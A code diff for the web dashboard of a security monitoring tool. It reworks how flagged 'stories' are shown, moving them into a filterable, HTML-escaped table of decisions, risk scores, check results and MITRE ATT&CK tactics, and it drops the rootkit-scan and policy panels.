-      sbox.innerHTML = '<span class="muted">No stories yet. Use the Barrier on the left or run `refmon guard` in a terminal!</span>';
+    const qbox = document.getElementById('quar-list');
+    qbox.textContent = st.quarantined.length ? st.quarantined.join(', ') : 'Empty';
+
+    // Filter stories
+    const filtered = st.stories.filter(s => {
+      if (currentFilter === 'attack') return s.category === 'attack' || s.category === 'malicious' || s.decision === 'block';
+      if (currentFilter === 'hold') return s.decision === 'hold' || s.category === 'borderline';
+      if (currentFilter === 'benign') return s.category === 'benign' || s.decision === 'allow';
+      return true;
+    });
+
+    const tbody = document.getElementById('stories-tbody');
+    if (!filtered.length) {
+      tbody.innerHTML = '<tr><td colspan="6" class="muted">No stories match the current filter.</td></tr>';
     } else {
-      sbox.innerHTML = st.stories.map(s => {
+      tbody.innerHTML = filtered.map(s => {
         const q = s.failed;
-        const pct = natsPercent(s.log_odds);
-        const col = decisionColor(s.decision);
+        let checkBadge = '<span class="tag neutral">Live Input</span>';
+        if (s.analysis_passed === true) {
+          checkBadge = `<span class="tag pass">Check: PASS (exp ${esc(s.expected).toUpperCase()})</span>`;
+        } else if (s.analysis_passed === false) {
+          checkBadge = `<span class="tag fail">Check: MISMATCH (exp ${esc(s.expected).toUpperCase()})</span>`;
+        }
+        const contribs = (s.contributions || []).map(c => `${c.signal} (${c.nats >= 0 ? '+' : ''}${c.nats})`).join(', ');
         return `
-        <div class="story">
-          <div class="story-head">
-            <div>
-              <span class="mono"><strong>${s.story_id}</strong></span>
-              <span class="muted">· ${s.events} ev · actors: ${s.roles.join(', ')}</span>
-            </div>
-            <div>
-              ${s.override ? `<span class="badge block">OVR:${s.override}</span> ` : ''}
-              <span class="badge ${s.decision}">${s.decision}</span>
-            </div>
-          </div>
-          <div style="margin-top:6px;">
-            <span class="qpill ${q.origin ? 'fail' : 'pass'}">Origin: ${q.origin ? 'FAIL' : 'ok'}</span>
-            <span class="qpill ${q.contract ? 'fail' : 'pass'}">Contract: ${q.contract ? 'FAIL' : 'ok'}</span>
-            <span class="qpill ${q.effect ? 'fail' : 'pass'}">Effect: ${q.effect ? 'FAIL' : 'ok'}</span>
-            <span class="mono muted" style="float:right">L = ${s.log_odds} nats (3/2/1 rule: ${s.rule_decision})</span>
-          </div>
-          <div class="meter"><div class="meter-fill" style="width:${pct}%; background:${col}"></div></div>
-          <div class="muted" style="margin-top:4px">${s.explanation}</div>
-          ${s.signals.length ? `<div class="mono muted" style="margin-top:4px">signals: ${s.signals.join(', ')}</div>` : ''}
-          ${s.tactics.length ? `<div class="mono muted">MITRE tactics: ${s.tactics.join(', ')}</div>` : ''}
-        </div>`;
+          <tr>
+            <td class="mono">
+              <strong>${esc(s.story_id)}</strong><br>
+              <span class="muted">${esc(s.ts)} UTC</span><br>
+              <span class="muted">${esc(s.platform)} · ${s.events} ev</span>
+            </td>
+            <td>
+              <strong>${esc(s.attack_type)}</strong><br>
+              <span class="tag neutral" style="margin-top:3px;">${esc(s.category)}</span>
+            </td>
+            <td>
+              <span class="tag ${esc(s.decision)}">${esc(s.decision).toUpperCase()}</span>
+              ${s.override ? `<span class="tag block">OVR:${esc(s.override)}</span>` : ''}
+              <div style="margin-top:4px;">${checkBadge}</div>
+              <div class="muted" style="margin-top:3px;">${esc(s.enforcement)}</div>
+            </td>
+            <td>
+              <div class="q-line">
+                <span class="q-chip ${q.origin ? 'qfail' : 'qok'}">Origin: ${q.origin ? 'FAIL' : 'OK'}</span>
+                <span class="q-chip ${q.contract ? 'qfail' : 'qok'}">Contract: ${q.contract ? 'FAIL' : 'OK'}</span>
+                <span class="q-chip ${q.effect ? 'qfail' : 'qok'}">Effect: ${q.effect ? 'FAIL' : 'OK'}</span>
+              </div>
+              <div class="muted mono">Failed: ${s.fail_count}/3 · 3/2/1 rule: ${esc(s.rule_decision)}</div>
+              ${s.contract_gate ? '<div class="muted mono">Contract gate: active (capped at HOLD)</div>' : ''}
+            </td>
+            <td class="mono">
+              <div><strong>L = ${s.log_odds} nats</strong> <span class="muted">(L0 = ${s.prior_log_odds})</span></div>
+              <div class="muted">Threshold crossed: ${esc(s.threshold_crossed)}</div>
+              ${contribs ? `<div class="muted" style="margin-top:3px;">${esc(contribs)}</div>` : ''}
+            </td>
+            <td>
+              <div>${esc(s.explanation)}</div>
+              <div class="muted mono" style="margin-top:4px;">
+                roles=[${esc(s.roles.join(', '))}] · events=[${esc(s.event_types.join(' -> '))}]
+                ${s.actions_taken.length ? ` · actions=[${esc(s.actions_taken.join(', '))}]` : ''}
+                ${s.tactics.length ? `<br>MITRE ATT&amp;CK: ${esc(s.tactics.join(', '))}` : ''}
+                ${s.fingerprints.length ? `<br>HMAC digests: ${esc(s.fingerprints.join(', '))}` : ''}
+              </div>
+            </td>
+          </tr>
+        `;
       }).join('');
     }
 
     document.getElementById('barrier-log').textContent = st.barrier_log.join('\\n') || 'Ready.';
     document.getElementById('events-log').textContent = st.events_log.join('\\n') || 'No events yet.';
-
-    document.getElementById('policy-meta').innerHTML = `
-      <div class="kv"><span>Digest</span><span class="mono">${st.policy.digest.slice(0, 18)}...</span></div>
-      <div class="kv"><span>Prior Log-Odds</span><span class="mono">${st.policy.prior_lo} nats</span></div>
-      <div class="kv"><span>Hold Threshold (τ_hold)</span><span class="mono">${st.policy.hold_thr} nats</span></div>
-      <div class="kv"><span>Block Threshold (τ_block)</span><span class="mono">${st.policy.block_thr} nats</span></div>
-      <div class="kv"><span>Protected Assets</span><span class="mono">${st.policy.protected_assets.join(', ')}</span></div>
-      <div class="kv"><span>Canaries Active</span><span class="mono">${st.policy.canaries.join(', ')}</span></div>
-    `;
-
-    const qbox = document.getElementById('quarantine-box');
-    qbox.innerHTML = st.quarantined.length
-      ? st.quarantined.map(f => `<div class="mono">Quarantined: ${f}</div>`).join('')
-      : '<span class="muted">Quarantine folder is empty.</span>';
-
-    const rk = st.rootkit;
-    document.getElementById('rootkit-box').innerHTML = `
-      <div>scanned: ${rk.scanned_at} (${rk.passes} passes)</div>
-      <div>modules: ${rk.kernel_modules_checked} · procs: ${rk.own_processes_inspected} · net: ${rk.network_interfaces_checked}</div>
-      <div>log-odds: ${rk.log_odds} nats · findings: ${rk.findings.length}</div>
-      ${rk.context_notes.map(n => `<div class="muted" style="margin-top:4px">${n}</div>`).join('')}
-    `;
-
-    document.getElementById('contracts-box').innerHTML = Object.entries(st.policy.contracts)
-      .map(([r, spec]) => `<div style="margin-bottom:6px"><strong>${r}</strong>: ${spec}</div>`)
-      .join('');
-  } catch (err) {
-    document.getElementById('pulse').style.background = '#ef4444';
+    document.getElementById('contracts-box').innerHTML =
+      `Protected assets: ${esc(st.policy.protected_assets.join(', '))}<br><br>` +
+      Object.entries(st.policy.contracts)
+        .map(([r, spec]) => `<div><strong>${esc(r)}</strong>: ${esc(spec)}</div>`)
+        .join('');
+  } catch (e) {
+    // Transient reload error ignored
   }
 }
 
